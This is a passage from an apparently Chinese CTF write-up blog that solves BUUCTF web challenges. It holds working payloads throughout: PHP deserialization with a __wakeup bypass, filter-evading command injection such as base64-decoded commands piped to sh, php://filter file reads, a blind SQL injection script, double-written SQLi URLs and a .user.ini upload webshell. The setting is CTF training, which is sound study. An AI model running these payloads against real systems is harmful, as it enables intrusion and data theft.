class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'yesyes'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">'guest'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You name is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You password is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>tips:<br><code>__wakeup()</code> 当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</p><p>关于类属性的访问权限：   </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public   不用修饰 </span><br><span class="line">private   需要加%00类名%00</span><br><span class="line">protected  则需要使用%00*%00</span><br></pre></td></tr></table></figure><p>answer:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name</span><br><span class="line">&#123;</span><br><span class="line">    private <span class="variable">$username</span> =<span class="string">'admin'</span> ;</span><br><span class="line">    private <span class="variable">$password</span> =100 ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(serialize(new Name()));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>将成员数目2修改为其他数目，private的不可打印字符用%00代替</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:<span class="string">"Name"</span>:3:&#123;s:14:<span class="string">"%00Name%00username"</span>;s:5:<span class="string">"admin"</span>;s:14:<span class="string">"%00Name%00password"</span>;i:100;&#125;</span><br></pre></td></tr></table></figure><h1 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h1><p>直接菜刀连接<br>flag在根目录   </p><h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p>在html源码中找到Secret.php文件，访问后提示要从<a href="https://www.Sycsecret.com访问，bp抓包添加header头部" target="_blank" rel="noopener">https://www.Sycsecret.com访问，bp抓包添加header头部</a> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: https://www.Sycsecret.com</span><br></pre></td></tr></table></figure><p>又提示Please use “Syclover” browser ,修改User-Agent</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Syclover</span><br></pre></td></tr></table></figure><p>又提示No!!! you can only read this locally!!! ,添加X-Forwarded-For</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure><h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>过滤了空格个flag的关键字   </p><p>answer:<br>命令执行变量拼接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure><p>过滤bash用sh执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure><p>内联执行</p><p>将反引号内命令的输出作为输入执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;cat$IFS$9&#96;ls&#96;</span><br></pre></td></tr></table></figure><p>可以查看index.php具体的过滤规则</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">&lt;pre&gt;PING <span class="number">1</span> (<span class="number">0.0</span><span class="number">.0</span><span class="number">.1</span>): <span class="number">56</span> data bytes</span><br><span class="line">/?ip=</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'ip'</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your symbol!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/ /"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your space!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/bash/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your bash!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/.*f.*l.*a.*g.*/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your flag!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">"ping -c 4 "</span>.$ip);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><p>php伪协议读取  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h1 id="Hack-World"><a href="#Hack-World" class="headerlink" title="Hack World"></a>Hack World</h1><p>写个脚本看过滤了什么</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_dict</span><span class="params">()</span>:</span></span><br><span class="line">    dict=[]</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"sqldict.txt"</span>,<span class="string">'r'</span>,encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">            dict.append(line.strip())</span><br><span class="line">    <span class="keyword">return</span> dict</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_filter</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">"http://2b245443-7cb2-4333-87d0-6e1d1048262b.node3.buuoj.cn/index.php"</span></span><br><span class="line"></span><br><span class="line">    valueFilter=[]</span><br><span class="line">    sqlDict=read_dict()</span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> sqlDict:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"id"</span>: <span class="string">"1"</span> + value</span><br><span class="line">        &#125;</span><br><span class="line">        res=requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"SQL Injection Checked."</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            valueFilter.append(value)</span><br><span class="line">            print(<span class="string">"Filter word: "</span>+value)</span><br><span class="line">    print(valueFilter)</span><br><span class="line">sql_filter()</span><br></pre></td></tr></table></figure><p>源码内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dbuser=<span class="string">'root'</span>;</span><br><span class="line">$dbpass=<span class="string">'root'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($sql)</span></span>&#123;</span><br><span class="line">    <span class="comment">#被过滤的内容 函数基本没过滤</span></span><br><span class="line">    $blackList = <span class="keyword">array</span>(<span class="string">' '</span>,<span class="string">'||'</span>,<span class="string">'#'</span>,<span class="string">'-'</span>,<span class="string">';'</span>,<span class="string">'&amp;'</span>,<span class="string">'+'</span>,<span class="string">'or'</span>,<span class="string">'and'</span>,<span class="string">'`'</span>,<span class="string">'"'</span>,<span class="string">'insert'</span>,<span class="string">'group'</span>,<span class="string">'limit'</span>,<span class="string">'update'</span>,<span class="string">'delete'</span>,<span class="string">'*'</span>,<span class="string">'into'</span>,<span class="string">'union'</span>,<span class="string">'load_file'</span>,<span class="string">'outfile'</span>,<span class="string">'./'</span>);</span><br><span class="line">    <span class="keyword">foreach</span>($blackList <span class="keyword">as</span> $blackitem)&#123;</span><br><span class="line">        <span class="keyword">if</span>(stripos($sql,$blackitem))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">    $id = $_POST[<span class="string">'id'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$db = mysql_connect(<span class="string">"localhost"</span>,$dbuser,$dbpass);</span><br><span class="line"><span class="keyword">if</span>(!$db)&#123;</span><br><span class="line">    <span class="keyword">die</span>(mysql_error());</span><br><span class="line">&#125;   </span><br><span class="line">mysql_select_db(<span class="string">"ctf"</span>,$db);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(safe($id))&#123;</span><br><span class="line">    $query = mysql_query(<span class="string">"SELECT content from passage WHERE id = $&#123;id&#125; limit 0,1"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>($query)&#123;</span><br><span class="line">        $result = mysql_fetch_array($query);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>($result)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $result[<span class="string">'content'</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Error Occured When Fetch Result."</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        var_dump($query);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"SQL Injection Checked."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由safe函数可知，限制了一些空格、逻辑连接符、注释符、一些操作的关键字。   </p><p>这里可以用字符串截断函数，把每个字符截断出来。如果当前字符等于某个字符，返回1，否则返回2。</p><p>比如: 截取到了flag中的第一个字符f时，从ascii码表里爆破 ， f =a 返回 2 ， f = f 返回1        </p><p>这里过滤的空格可以用括号代替<br>answer：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary</span><span class="params">()</span>:</span></span><br><span class="line">    url=<span class="string">"http://2b245443-7cb2-4333-87d0-6e1d1048262b.node3.buuoj.cn/index.php"</span></span><br><span class="line">    flag=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        left = <span class="number">0x1f</span></span><br><span class="line">        right = <span class="number">0x7f</span></span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            mid=left+(right-left)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> left==mid:</span><br><span class="line">                flag=flag+chr(left)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            payload=<span class="string">"if(ascii((mid((select(flag)from(flag)),&#123;&#125;,1)))&lt;&#123;&#125;,1,2)"</span></span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">"id"</span>:payload.format(i,mid)</span><br><span class="line">            &#125;</span><br><span class="line">            res=requests.post(url=url,data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"Hello"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                right=mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left=mid</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"&#125;"</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">binary()</span><br><span class="line">`</span><br></pre></td></tr></table></figure><h1 id="ACTF2020-新生赛Exec"><a href="#ACTF2020-新生赛Exec" class="headerlink" title="ACTF2020 新生赛Exec"></a>ACTF2020 新生赛Exec</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| cat &#x2F;flag</span><br></pre></td></tr></table></figure><h1 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="强网杯 2019]高明的黑客"></a>强网杯 2019]高明的黑客</h1><h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><p>黑名单，没有过滤phtml, 检测文件头，以及过滤了php<br><img src="../../images/ctf/buuctf/1.jpg" alt=""></p><h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p>过滤了union、select、from、where   </p><p>得到表名b4bsql,geekuser  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://b74ce88f-f71f-499f-802f-109c754855d2.node3.buuoj.cn/check.php?username=ad&amp;password=pa<span class="string">' uniunionon seselectlect 1,(seleselectct group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()),3%23</span></span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://b74ce88f-f71f-499f-802f-109c754855d2.node3.buuoj.cn/check.php?username=ad&amp;password=pa<span class="string">' uniunionon seselectlect 1,(seleselectct group_concat(passwoorrd) frofromm b4bsql),3%23</span></span><br></pre></td></tr></table></figure><h1 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h1><p>phtml绕过  </p><h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><p>index.php.bak备份</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>弱类型 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key=123</span><br></pre></td></tr></table></figure><h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p><img src="../../images/ctf/buuctf/2.jpg" alt=""></p><h1 id="SUCTF-2019-CheckIn-1"><a href="#SUCTF-2019-CheckIn-1" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>综上所述.user.ini的利用条件如下：</p><ul><li>服务器脚本语言为PHP</li><li>服务器使用CGI／FastCGI模式</li><li>上传目录下要有可执行的php文件   </li></ul><p>从这来看.user.ini要比.htaccess的应用范围要广一些，毕竟.htaccess只能用于Apache<br>利用.user.ini进行文件上传，参考自从SUCTF 2019 CheckIn 浅谈.user.ini的利用<br>上传这样的一个ini文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=a.jpg</span><br></pre></td></tr></table></figure><p>再上传一个a.jpg文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">'php'</span>&gt;system(<span class="string">'cat /flag'</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>题目   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解题：<br>读取useless.php文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure><p>useless.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>echo 刚好以字符串形式调用Flag类，所以直接赋值$file=”flag.php”,最后payload如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:<span class="string">"Flag"</span>:1:&#123;s:4:<span class="string">"file"</span>;s:8:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure><h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1><p>访问robots.txt，发现存在user.php.bak备份<br>user.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 